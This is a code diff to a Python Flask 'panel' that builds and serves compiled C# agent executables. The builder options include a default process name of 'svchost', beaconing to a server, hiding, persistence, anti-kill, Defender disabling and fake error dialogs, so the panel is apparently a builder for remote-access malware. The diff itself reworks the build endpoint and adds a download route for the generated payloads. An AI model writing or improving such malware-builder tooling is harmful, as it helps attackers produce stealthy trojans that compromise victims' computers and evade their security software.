@@ -1127,9 +1127,9 @@ def panel_build():
         'server': data.get('server', '').strip().rstrip('/'),
         'name': re.sub(r'[^\w]', '', data.get('name', 'svchost')),
         'id': data.get('id', 'AUTO').strip(),
-        'beacon': int(data.get('beacon_interval', 5000)),
+        'beacon': int(data.get('beacon_interval', data.get('beacon', 5000))),
         'hidden': data.get('hidden', True),
-        'persistence': data.get('persistence', False),
+        'persistence': data.get('persistence', data.get('persist', False)),
         'anti_kill': data.get('anti_kill', False),
         'disable_defender': data.get('disable_defender', False),
         'fake_error': data.get('fake_error', False),
@@ -1149,38 +1149,64 @@ def panel_build():
         logger.error(f"Build generation error: {e}")
         return jsonify({'ok': False, 'error': str(e)}), 500
 
-    # Try to compile
+    # Build signature
     build_sig = hashlib.sha256(source.encode()).hexdigest()[:16]
     state.append_log(f"Build: {bc['name']} (sig:{build_sig}) by {request.session.get('user','?')}", 'info')
 
-    # Find compiler
-    compiler = find_csharp_compiler()
+    result = {
+        'ok': True,
+        'source': source,
+        'build_sig': build_sig,
+        'name': bc['name'],
+        'compile_status': 'no_compiler',
+        'compile_error': None,
+        'download_url': None
+    }
 
+    # Try to compile
+    compiler = find_csharp_compiler()
     if compiler:
         try:
             exe_path = compile_agent(source, bc['name'], compiler)
             if exe_path and os.path.exists(exe_path):
-                return send_file(
-                    exe_path,
-                    as_attachment=True,
-                    download_name=f"{bc['name']}.exe",
-                    mimetype='application/octet-stream'
-                )
+                # Save to BUILD_DIR with accessible name
+                final_name = f"{bc['name']}_{build_sig}.exe"
+                final_path = os.path.join(Config.BUILD_DIR, final_name)
+                shutil.copy2(exe_path, final_path)
+                result['compile_status'] = 'success'
+                result['download_url'] = f"/api/panel/download_build?file={final_name}"
+                state.append_log(f"Build compiled: {final_name}", 'info')
+            else:
+                result['compile_status'] = 'failed'
+                result['compile_error'] = 'Compilation failed. Check server logs.'
         except Exception as e:
             logger.error(f"Compilation error: {e}")
-            # Fall through to return source
+            result['compile_status'] = 'failed'
+            result['compile_error'] = str(e)
+    else:
+        result['compile_status'] = 'no_compiler'
+        result['compile_error'] = 'No C# compiler (mcs/csc) found on server. Source code returned.'
 
-    # No compiler — return .cs source
+    # Always save .cs source
     source_path = os.path.join(Config.BUILD_DIR, f"{bc['name']}_{build_sig}.cs")
     with open(source_path, 'w', encoding='utf-8') as f:
         f.write(source)
 
-    return send_file(
-        source_path,
-        as_attachment=True,
-        download_name=f"{bc['name']}.cs",
-        mimetype='text/plain'
-    )
+    return jsonify(result)
+
+
+@app.route('/api/panel/download_build')
+@require_auth
+def download_build():
+    """Download compiled build"""
+    filename = request.args.get('file', '')
+    filename = re.sub(r'[^\w.\-]', '', filename)  # Sanitize
+    filepath = os.path.join(Config.BUILD_DIR, filename)
+    if os.path.exists(filepath):
+        return send_file(filepath, as_attachment=True, download_name=filename,
+                         mimetype='application/octet-stream')
+    return jsonify({'ok': False, 'error': 'File not found'}), 404
+
 
 
 def find_csharp_compiler():
